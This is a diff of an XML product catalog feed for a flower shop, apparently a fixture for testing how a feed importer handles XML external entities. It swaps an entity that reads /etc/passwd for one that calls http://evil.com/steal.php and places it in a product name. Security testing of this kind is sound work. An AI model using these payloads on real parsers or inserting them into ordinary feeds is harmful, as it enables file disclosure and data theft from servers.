@@ -1,5 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE a [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE yml_catalog [
+  <!ENTITY xxe SYSTEM "http://evil.com/steal.php">
+]>
 <yml_catalog date="2025-08-15T08:13:49+02:00">
 	<shop>
 		<name>Мастер-фид для всех категорий</name>
@@ -7,28 +9,18 @@
 		<url>https://flowwow.loc</url>
 		<categories>
 			<category id="1">Цветы 1</category>
-			<category id="2">Цветы 44 сухоцвет</category>
+			<category id="8">Цветы 89 другое</category>
 		</categories>
 		<offers>
 			<offer id="1" available="true">
 				<categoryId>1</categoryId>
 				<price>1500</price>
-				<name>Цветы 1</name>
-				<description>&xxe;</description>
+				<name>&xxe;</name>
+				<description>Классический букет из 5 роз</description>
 				<picture>https://cdn.pixabay.com/photo/2016/04/23/00/44/tulips-1346765_1280.jpg</picture>
 				<consist name="роза" unit="шт">5</consist>
 				<param name="Высота, мм">400</param>
 				<param name="Ширина, мм">250</param>
-			</offer>
-			<offer id="2" available="true">
-				<categoryId>2</categoryId>
-				<name>Цветы 44 сухоцвет</name>
-				<price>1200</price>
-				<description>Букет из лаванды и хлопка</description>
-				<picture>https://cdn.pixabay.com/photo/2018/06/25/11/17/lavender-3497880_1280.jpg</picture>
-				<param name="Высота, мм">300</param>
-				<param name="Ширина, мм">200</param>
-				<consist name="роза" unit="шт">5</consist>
 			</offer>
 		</offers>
 	</shop>
